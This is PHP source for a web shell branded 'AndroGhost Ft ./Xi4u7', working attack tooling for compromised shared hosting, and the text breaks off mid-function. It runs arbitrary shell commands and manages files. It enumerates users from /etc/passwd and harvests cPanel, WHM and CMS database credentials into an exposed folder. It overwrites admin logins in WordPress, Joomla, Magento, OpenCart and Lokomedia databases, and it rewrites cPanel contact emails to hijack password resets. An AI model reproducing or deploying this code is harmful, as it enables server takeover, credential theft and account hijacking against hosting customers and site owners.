<?php
error_reporting(0);
function exect($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$exect = ""; 		
		foreach($results as $result) { 			
			$exect .= $result; 		
		} return $exect; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$exect = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $exect; 	
	} elseif(function_exists('shell_exec')) { 		
		$exect = @shell_exec($cmd); 		
		return $exect; 
	} elseif (is_resource($f = @popen($cmd,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
		return $out;
	}
}

function entre2v2($text,$marqueurDebutLien,$marqueurFinLien,$i=1){
	$ar0=explode($marqueurDebutLien, $text);
	$ar1=explode($marqueurFinLien, $ar0[$i]);
	return trim($ar1[0]);
 }

function fperms($filen) {
$perms = fileperms($filen);
$fpermsinfo .= (($perms & 0x0100) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0080) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));
$fpermsinfo .= (($perms & 0x0020) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0010) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));
$fpermsinfo .= (($perms & 0x0004) ? 'r' : '-');
$fpermsinfo .= (($perms & 0x0002) ? 'w' : '-');
$fpermsinfo .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));
echo '<center><small>'.$fpermsinfo.'</small></center>';
}

?>
<title>AndroGhost Ft ./Xi4u7</title>
<link href='//fonts.googleapis.com/css?family=Share+Tech+Mono' rel='stylesheet' type='text/css'>
<style type="text/css">
	body {
		font-family: courier;
		background: #f2f2f2;
		font-size: 1px;
	}
	h1 a {
		font-weight: normal;
		font-family: 'Share Tech Mono';
		font-size: 20px;
		color:#006600;
		text-decoration: none;
		margin: 0px;
	}
	h2 {
		font-size: 20px;
		color: #006600;
		text-align: center;
		padding-top: 5px;
		margin: 0;
		margin-top: 10px;
	}
	.menu {
		text-align: center;
		font-size: 12px;
		border-bottom: 1px dashed #006600;
		padding-bottom: 5px;
		margin-bottom: 10px;
	}
	.menu a {
		margin-top: 2px;
		color: #006600;
		text-decoration: none;
		display: inline-block;
	}
	.container {
		font-size: 12px;
	}
	.filemgr {
		font-size: 12px;
		width: 100%
	}
	.filemgr td {
		padding: 3px;
		border-bottom: 1px dashed #006600;
	}
	.filemgr a{
		text-decoration: none;
		color:#006600;
	}
	tr:hover {
		background: #cccccc;
	}
	.tdtl {
		background:#006600;color:#ffffff;text-align:center;font-weight:bold;
	}
	.footer {
		text-align: center;
		border-radius: 30px;
		margin-top: 25px;
		border-top: 1px double #006600;
		padding: 5px;
	}
	.footer a {
		color: #006600;
		text-decoration: none;
	}
	p {
    	word-wrap: break-word;
    	margin:2;
	}
	a {
		text-decoration: none;
		color: #006600;
	}
	.act {
		text-align: center;
	}
	.txarea {
		width:100%;
		height:200px;
		background:transparent;
		border:1px solid #006600;
		padding:1px;color:#006600;
	}
</style>
<div class="container">
<div style="position:relative;width: 100%;margin-bottom: 5px;border-bottom: 1px dashed #006600;">
	<div style="float: left;width: 15%;text-align: center;border: 1px dashed #006600;margin-bottom: 5px;">
	<h1><a href="?">./Xi4u7 & AndroGhost<br><small>V 1.5 (Beta)</small></a></h1>
	</div>
	<div style="float: right;width: 83%;">
	<?php
		echo php_uname();
		$mysql = (function_exists('mysql_connect')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$curl = (function_exists('curl_version')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$wget = (exect('wget --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$perl = (exect('perl --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$gcc = (exect('gcc --help')) ? "<font color=#006600>ON</font>" : "<font color=red>OFF</font>";
		$disfunc = @ini_get("disable_functions");
		$show_disf = (!empty($disfunc)) ? "<font color=red>$disfunc</font> <a href='?bypass=killdiscfunc' style='text-decoration:none;color:#0000FF;font-weight: bold;'>[ KILL ME ]</a>" : "<font color=#006600>NONE</font>";
		echo '<br>[ MySQL: '.$mysql.' ][ Curl: '.$curl.' ][ Wget: '.$wget.' ][ Perl: '.$perl.' ][ Compiler: '.$gcc.' ]';
		echo '<p>Disable Function: '.$show_disf;

	?>
	</div>
	<div style="clear: both;" ="clear"></div>
</div>

<?php

if(empty($_GET)) {
	$dir = getcwd();
}
else {
	$dir = $_GET['path'];
}

if(!empty($_GET['path'])) {$offdir = $_GET['path'];}
else if(!empty($_GET['file'])) {$offdir = dirname($_GET['file']);}
else if(!empty($_GET['lastpath'])) {$offdir = $_GET['lastpath'];}
else {$offdir = getcwd();}

?>
<div class="menu">
<a href="?ext=jump&lastpath=<?php echo $offdir;?>">[ Jumping ]</a>
<a href="?ext=scupdate&lastpath=<?php echo $offdir;?>">[ Jumping Backup Script Update ]</a>
<a href="?ext=autoedt&lastpath=<?php echo $offdir;?>">[ Auto Edit User ]</a>
<a href="?ext=fantastico&lastpath=<?php echo $offdir;?>">[ Jumping Backup Fantastico ]</a>
<a href="?ext=prvconf&lastpath=<?php echo $offdir;?>">[ Priv8 Get Config By AndroGhost ]</a>
<a href="?ext=sql_interface&lastpath=<?php echo $offdir;?>">[ MySQL Interface ]</a>
<a href="?ext=shellcmd&lastpath=<?php echo $offdir;?>">[ Shell Command ]</a>
<a href="?ext=uploader&lastpath=<?php echo $offdir;?>">[ Uploader ]</a>
<a href="?ext=readcp&lastpath=<?php echo $offdir;?>">[ Priv Config Grabber By ./Xi4u7 ]</a>
<a href="?ext=rescpas&lastpath=<?php echo $offdir;?>">[ Priv Cpanel Password Reset By ./Xi4u7 ]</a>
</div>
<?php
## CURRENT DIR ##

echo '<div style="margin-bottom:10px;">';
echo '<span style="border:1px dashed #009900;padding:2px;">';
$lendir = str_replace("\\","/",$offdir);
$xlendir = explode("/", $lendir);
foreach($xlendir as $c_dir => $cdir) {	
	echo "<a href='?path=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $xlendir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo '</span></div>';
## EOF CURRENT DIR ##

if(!empty($dir)) {
echo '<table class="filemgr">';
echo '<tr><td class="tdtl">Name</td><td class="tdtl" width="9%">Permission</td><td class="tdtl" width="18%">Action</td></tr>'."\n";
$directories = array();
$files_list  = array();
$files = scandir($dir);
foreach($files as $file){
   if(($file != '.') && ($file != '..')){
      if(is_dir($dir.'/'.$file)){
         $directories[] = $file;

      } else{
         $files_list[] = $file;

      }
   }
}

foreach($directories as $directory){
	echo '<tr><td><span class="dbox">[D]</span> <a href="?path='.$dir.'/'.$directory.'">'.$directory.'/</a></td>'."\n";
	echo '<td>';
	fperms($dir.'/'.$directory);
	echo '</td>'."\n";
	echo '<td class="act">';
	echo '<a href="?action=rename&file='.$dir.'/'.$directory.'" class="act">RENAME</a> ';
	echo '<a href="?action=rmdir&file='.$dir.'/'.$directory.'" class="act">DELETE</a>';
	echo '</td>'."\n";
	echo '</tr>'."\n";
}
foreach($files_list as $filename){
	if(preg_match('/(php)$/', $filename)) {
		echo '<tr><td><span class="dbox">[F]</span> <a href="?action=view&file='.$dir.'/'.$filename.'" class="act">'.$filename.'</a>'."\n";
		echo ' <a href="?ext=movecfg&cfg='.$dir.'/'.$filename.'" style="background:#006600;color:#ffffff;padding:1px;padding-left:5px;padding-right:5px;">MOVE CONFIG</a>';
		echo '</td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=edit&file='.$dir.'/'.$filename.'" class="act">EDIT</a> ';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	} 
	else if(preg_match('/(tar.gz|tgz)$/', $filename)) {
		echo '<tr><td><span class="dbox">[F]</span> <a href="#" class="act">'.$filename.'</a>'."\n";
		echo ' <a href="?ext=extract2tmp&gzname='.$dir.'/'.$filename.'" style="background:#006600;color:#ffffff;padding:1px;padding-left:5px;padding-right:5px;">EXTRACT TO TMP</a>';
		echo '</td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	} 
	else {
		echo '<tr><td><span class="dbox">[F]</span> <a href="?action=view&file='.$dir.'/'.$filename.'" class="act">'.$filename.'</a></td>'."\n";
		echo '<td>';
		fperms($dir.'/'.$filename);
		echo '</td>'."\n";
		echo '<td class="act">';
		echo '<a href="?action=edit&file='.$dir.'/'.$filename.'" class="act">EDIT</a> ';
		echo '<a href="?action=rename&file='.$dir.'/'.$filename.'" class="act">RENAME</a> ';
		echo '<a href="?action=delete&file='.$dir.'/'.$filename.'" class="act">DELETE</a> ';
		echo '<a href="?action=download&file='.$dir.'/'.$filename.'" class="act">DOWNLOAD</a>';
		echo '</td>'."\n";
		echo '</tr>'."\n";
	}
}
echo '</table>';
}

if($_GET['action'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=#006600>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<form method='post'>
	<textarea name='src' class='txarea'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 20%;background:#006600;border:none;color:#f2f2f2;margin-top:5px;height:30px;'>
	</form>";
}
else if($_GET['action'] == 'view') {
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<textarea class='txarea' style='height:400px;' readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
}
else if($_GET['action'] == 'rename') {
	$path = $offdir;
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$path/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<font color=#006600>Successed!</font>";
		} else {
			$act = "<font color=red>Permission Denied!</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=#006600>".basename($_GET['file'])."</font>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
}
else if($_GET['action'] == 'delete') {
	$path = $offdir;
	$delete = unlink($_GET['file']);
	if($delete) {
		
	} else {
		$act = "<font color=red>Permission Denied!</font>";
	}
	echo $act;
} else if($_GET['action'] == 'rmdir') {
	$path = $offdir;
	$delete = rmdir($_GET['file']);
	if($delete) {
		echo '<font color=#006600>Deleted!</font><br>';
	} else {
		echo "\n<font color=#006600>Try Force Delete!</font>\n<br>";
		exect('rm -rf '.$_GET['file']);
		if(file_exists($_GET['file'])) {
			echo '<font color=red>Permission Denied!</font>';
		} else
		{
			echo '<font color=#006600>Deleted!</font>';
		}
	}

} else if($_GET['action'] == 'download') {
	@ob_clean();
	$file = $_GET['file'];
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.$file.'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}

if($_GET['ext'] == 'scupdate') {
	echo '<h2>.::[ Jumping From Backup Scriptupdate ]::.</h2>';
		$i = 0;
		echo "<pre><div class='margin: 5px auto;'>";
		$etc = fopen("/etc/passwd", "r");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user);
				foreach($user[1] as $users) {
					$user_dir = "/home/$users/scriptupdate";
					if(is_readable($user_dir)) {
						$i++;
						$jrw = "[R] <a href='?path=$user_dir'>/home/$users/scriptupdate</a>";
						if(is_writable($user_dir)) {
							$jrw = "[RW] <a href='?path=$user_dir'>/home/$users/scriptupdate</a>";
						}
						echo $jrw."\n";
					}
				}
			}
		}
		if($i == 0) { 
			echo '<center><font color=red>scriptupdate is null in this host!</font></center>';
		} else {
			echo "<br>Total ".$i." Users in ".gethostbyname($_SERVER['HTTP_HOST'])."";
		}
		echo "</div></pre>";
}

if($_GET['ext'] == 'fantastico') {
	echo '<h2>.::[ Jumping From Backup Fantastico ]::.</h2>';
		$i = 0;
		echo "<pre><div class='margin: 5px auto;'>";
		$etc = fopen("/etc/passwd", "r");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<center><font color=red>Can't read /etc/passwd</font></center>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user);
				foreach($user[1] as $users) {
					$user_dir = "/home/$users/fantastico_backups";
					if(is_readable($user_dir)) {
						$i++;
						$jrw = "[R] <a href='?path=$user_dir'>/home/$users/fantastico_backups</a>";
						if(is_writable($user_dir)) {
							$jrw = "[RW] <a href='?path=$user_dir'>/home/$users/fantastico_backups</a>";
						}
						echo $jrw."\n";
					}
				}
			}
		}
		if($i == 0) { 
			echo '<center><font color=red>scriptupdate is null in this host!</font></center>';
		} else {
			echo "<br>Total ".$i." Users in ".gethostbyname($_SERVER['HTTP_HOST'])."";
		}
		echo "</div></pre>";
}

if($_GET['ext'] == 'readcp') {
echo '<h2>.::[ Private Config Grabber By ./Xi4u7 ]::.</h2>';
$path = getcwd();
mkdir("Xi4u7_Config2");
$usa = fopen('/etc/passwd','r');
while($us = fgets($usa)){
if($us==""){
	echo "can't read /etc/passwd";
}
else{
preg_match_all('/(.*?):x:/', $us, $user_byk);
    foreach($user_byk[1] as $user){
    	$dir1 = "/home/$user/.my.cnf";
    	if(is_readable($dir1)){
           copy($dir1, $path."/Xi4u7_Config2/".$user."-Cpanel.txt");
       }
       $hash = "/home/$user/.accesshash";
       if(is_readable($hash)){
           copy($hash, $path."/Xi4u7_Config2/".$user."-Accesshash.txt");
       }
       $wp = "/home/$user/public_html/wp-config.php";
       if(is_readable($wp)) {
           copy($wp, $path."/Xi4u7_Config2/".$user."-Wordpress.txt");
       }
       $joomla = "/home/$user/public_html/configuration.php";
       if(is_readable($joomla)) {
           copy($joomla, $path."/Xi4u7_Config2/".$user."-Joomla.txt");
       }
       $usrini = "/home/$user/.usr.ini";
       if(is_readable($usrini)) {
           copy($usrini, $path."/Xi4u7_Config2/".$user."-Cpanel2.txt");
       }
    	else{
    	}
   }
}
}
echo "<center><a href='?path=".$path."/Xi4u7_Config2'>Wes Cok Klik Kene! Mpzzz</a>";
}

if($_GET['ext'] == 'prvconf') {
	echo '<h2>.::[ Get Config Private By AndroGhost ]::.</h2>';
$etc = fopen("/etc/passwd", "r") or die("<pre><font color=red>Can't read /etc/passwd</font></pre>");
	$idx = mkdir("idx_config", 0777);
	$isi_htc = "Options all\nRequire None\nSatisfy Any";
	$htc = fopen("idx_config/.htaccess","w");
	fwrite($htc, $isi_htc);
	while($passwd = fgets($etc)) {
		if($passwd == "" || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_config);
			foreach($user_config[1] as $user_idx) {
				$user_config_dir = "/home/$user_idx/public_html/";
				if(is_readable($user_config_dir)) {
					$grab_config = array(
						"/home/$user_idx/.my.cnf" => "cpanel",
						"/home/$user_idx/public_html/wp-config.php" => "Wordpress",
						"/home/$user_idx/public_html/configuration.php" => "Joomla",
						"/home/$user_idx/.accesshash" => "WHM-accesshash",
						"/home/$user_idx/vdo_config.php" => "Voodoo",
						"/home/$user_idx/bw-configs/config.ini" => "BosWeb",
						"/home/$user_idx/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/lokomedia/config/koneksi.php" => "Lokomedia",
						"/home/$user_idx/clientarea/configuration.php" => "WHMCS",
						"/home/$user_idx/whm/configuration.php" => "WHMCS",
						"/home/$user_idx/whmcs/configuration.php" => "WHMCS",
						"/home/$user_idx/forum/config.php" => "phpBB",
						"/home/$user_idx/sites/default/settings.php" => "Drupal",
						"/home/$user_idx/config/settings.inc.php" => "PrestaShop",
						"/home/$user_idx/app/etc/local.xml" => "Magento",
						"/home/$user_idx/joomla/configuration.php" => "Joomla",
						"/home/$user_idx/configuration.php" => "Joomla",
						"/home/$user_idx/wp/wp-config.php" => "WordPress",
						"/home/$user_idx/wordpress/wp-config.php" => "WordPress",
						"/home/$user_idx/wp-config.php" => "WordPress",
						"/home/$user_idx/admin/config.php" => "OpenCart",
						"/home/$user_idx/slconfig.php" => "Sitelok",
						"/home/$user_idx/application/config/database.php" => "Ellislab");
					foreach($grab_config as $config => $nama_config) {
						$ambil_config = file_get_contents($config);
						if($ambil_config == '') {
						} else {
							$file_config = fopen("idx_config/$user_idx-$nama_config.txt","w");
							fputs($file_config,$ambil_config);
						}
					}
				}		
			}
		}	
	}
	echo "<center><a href='?dir=$dir/idx_config'><font color=lime>Done</font></a></center>";
}

if($_GET['ext'] == 'jump') {
$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_idx_jump) {
				$user_jumping_dir = "/home/$user_idx_jump/public_html/";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_jump = file_get_contents("/etc/named.conf");	
						if($domain_jump == '') {
							echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_jumping_url = $user_jumping_url['name'];
								if($user_jumping_url == $user_idx_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
}

elseif($_GET['ext'] == 'rescpas') {
	echo "<center><h1>Cpanel Passwrod Reset</h1>";
	if($_POST['reset']) {
		$email = $_POST['email'];
		$user = get_current_user();
		$site = $_SERVER['HTTP_HOST'];
		$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
		fwrite($f, $email);
		fclose();
		$f = fopen('/home/'.$user.'/.contactinfo', 'w');
		fwrite($f, $email);
		echo "--------------------";
		echo "New Email : ".$email;
		echo "Username : ".$user;
		echo "Url Reset : ".$site.":2082/?resetpass=1";
		echo "--------------------</center>";
	} else {
		echo "<from action='' method='post'>";
		echo "<input type='email' name='email' value='androsec1337@gmail.com'>";
		echo "<br><input type='submit' value='Gass Cok!!' name='reset'>";
		echo "</center></from>";
	}
}

elseif($_GET['ext'] == 'autoedt') {
if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='".$offdir."'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='AndroGhost' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='AndroGhost' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
		</form>
		<span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
		";
	}
}

else if($_GET['ext'] == 'movecfg') {
	$cok = $_SERVER['DOCUMENT_ROOT'];
	if(is_writable($cok.'/Xi4u7_Config')) {
		echo '<form method="post" action="">';
		echo '<input name="dancok" type="text" placeholder="user-cms.txt">';
		echo '<input name="pindahx" type="submit" value="MOVE">';
		echo '</form>';
		if(!empty($_POST['pindahx'])) {
			exect('cat '.$_GET['cfg'].' > '.$cok.'/Xi4u7_Config/'.$_POST['dancok']);
